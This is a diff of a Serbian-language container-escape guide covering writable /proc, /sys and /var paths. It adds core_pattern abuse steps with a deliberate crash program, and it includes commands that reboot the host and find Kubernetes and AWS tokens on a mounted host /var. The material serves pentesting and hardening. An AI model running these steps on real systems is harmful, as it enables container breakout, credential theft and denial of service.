@@ -15,50 +15,62 @@ Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično p
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Omogućava definisanje programa koji će se izvršiti prilikom generisanja core datoteke sa prvih 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako datoteka počinje sa cevom `|`.
-- **Primer testiranja i eksploatacije**:
+- Ako možete da pišete unutar ove datoteke, moguće je napisati cevi `|` praćene putanjom do programa ili skripte koja će biti izvršena nakon što dođe do kvara.
+- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog datotečnog sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.
 
+- **Primer testiranja i eksploatacije**:
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
 echo "|$overlay/shell.sh" > core_pattern # Set custom handler
 sleep 5 && ./crash & # Trigger handler
 ```
+Proverite [ovaj post](https://pwning.systems/posts/escaping-containers-for-fun/) za više informacija.
 
+Primer programa koji se ruši:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
-- Detaljno opisano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Detaljno u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Sadrži putanju do učitača kernel modula, koji se poziva za učitavanje kernel modula.
 - **Primer provere pristupa**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Proveri pristup modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Pomenuto u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Referencirano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Globalna zastavica koja kontroliše da li kernel panici ili poziva OOM killer kada dođe do OOM uslova.
 
 #### **`/proc/sys/fs`**
 
 - Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o datotečnom sistemu.
-- Pristup za pisanje može omogućiti različite napade uskraćivanja usluge protiv hosta.
+- Pristup za pisanje može omogućiti razne napade uskraćivanja usluge protiv hosta.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Omogućava registraciju interpretatora za nenativne binarne formate na osnovu njihovog magičnog broja.
+- Omogućava registraciju interpretera za nenativne binarne formate na osnovu njihovog magičnog broja.
 - Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` zapisiv.
 - Relevantna eksploatacija i objašnjenje:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### Others in `/proc`
+### Ostalo u `/proc`
 
 #### **`/proc/config.gz`**
 
 - Može otkriti konfiguraciju kernela ako je `CONFIG_IKCONFIG_PROC` omogućeno.
-- Korisno za napadače da identifikuju ranjivosti u pokrenutom kernelu.
+- Korisno za napadače da identifikuju ranjivosti u aktivnom kernelu.
 
 #### **`/proc/sysrq-trigger`**
 
@@ -66,19 +78,19 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
 - **Primer restartovanja hosta**:
 
 ```bash
-echo b > /proc/sysrq-trigger # Reboots the host
+echo b > /proc/sysrq-trigger # Restartuje host
 ```
 
 #### **`/proc/kmsg`**
 
 - Izlaže poruke iz kernel ring bafera.
-- Može pomoći u kernel eksploatacijama, curenjima adresa i pružiti osetljive sistemske informacije.
+- Može pomoći u kernel eksploatacijama, curenjima adresa i pružiti osetljive informacije o sistemu.
 
 #### **`/proc/kallsyms`**
 
-- Lista kernel izvezene simbole i njihove adrese.
+- Lista kernel eksportovane simbole i njihove adrese.
 - Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
-- Informacije o adresama su ograničene sa `kptr_restrict` postavljenim na `1` ili `2`.
+- Informacije o adresama su ograničene kada je `kptr_restrict` postavljen na `1` ili `2`.
 - Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
@@ -111,10 +123,10 @@ echo b > /proc/sysrq-trigger # Reboots the host
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Pruža informacije o tačkama montiranja u prostoru imena montiranja procesa.
-- Izlaže lokaciju kontejnera `rootfs` ili slike.
+- Pruža informacije o tačkama montiranja u namespace-u montiranja procesa.
+- Izlaže lokaciju kontejnerskog `rootfs` ili slike.
 
-### `/sys` Vulnerabilities
+### `/sys` Ranjivosti
 
 #### **`/sys/kernel/uevent_helper`**
 
@@ -148,7 +160,7 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Curi kernel adrese, potencijalno ugrožavajući KASLR.
+- Curi adrese kernela, potencijalno kompromitujući KASLR.
 
 #### **`/sys/kernel/security`**
 
@@ -158,20 +170,20 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**
 
 - Izlaže interfejse za interakciju sa EFI varijablama u NVRAM-u.
-- Pogrešna konfiguracija ili eksploatacija može dovesti do "brickovanja" laptopova ili nebootabilnih host mašina.
+- Pogrešna konfiguracija ili eksploatacija može dovesti do "brick"-ovanih laptopova ili nebootabilnih host mašina.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` nudi "bez pravila" debagiranje interfejsa za kernel.
-- Istorija bezbednosnih problema zbog svoje neograničene prirode.
+- `debugfs` nudi "bez pravila" interfejs za debagovanje kernela.
+- Istorija sigurnosnih problema zbog svoje neograničene prirode.
 
-### `/var` Vulnerabilities
+### `/var` Ranjivosti
 
-Hostova **/var** fascikla sadrži sokete kontejnerskog runtime-a i datotečne sisteme kontejnera. Ako je ova fascikla montirana unutar kontejnera, taj kontejner će dobiti pristup za čitanje i pisanje drugim datotečnim sistemima kontejnera sa root privilegijama. Ovo se može zloupotrebiti za prebacivanje između kontejnera, izazivanje uskraćivanja usluge ili postavljanje backdoora u druge kontejnere i aplikacije koje se u njima izvršavaju.
+Hostova **/var** fascikla sadrži socket-e kontejnerskog runtime-a i datotečne sisteme kontejnera. Ako je ova fascikla montirana unutar kontejnera, taj kontejner će dobiti pristup za čitanje i pisanje do datotečnih sistema drugih kontejnera sa root privilegijama. Ovo se može zloupotrebiti za prebacivanje između kontejnera, uzrokovanje uskraćivanja usluge ili postavljanje backdoor-a u druge kontejnere i aplikacije koje se u njima izvršavaju.
 
 #### Kubernetes
 
-Ako je ovakav kontejner raspoređen sa Kubernetes:
+Ako je kontejner poput ovog raspoređen sa Kubernetes:
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -224,7 +236,7 @@ Takođe možete zameniti konfiguracione datoteke, binarne datoteke, servise, dat
 
 ##### Pristup cloud kredencijalima
 
-Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene što omogućava kontejneru da dobije neovlašćen pristup K8s ili cloudu:
+Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene što omogućava kontejneru da dobije neovlašćen pristup K8s ili cloud:
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -253,8 +265,8 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Napomena
 
-Stvarne putanje mogu se razlikovati u različitim postavkama, zbog čega je najbolje koristiti **find** komandu za
-lociranje datoteka drugih kontejnera i SA / web identitet tokena
+Stvarne putanje mogu se razlikovati u različitim postavkama, zbog čega je najbolje da koristite **find** komandu da
+pronađete datoteke drugih kontejnera i SA / web identitet tokene.
 
 ### Reference
 
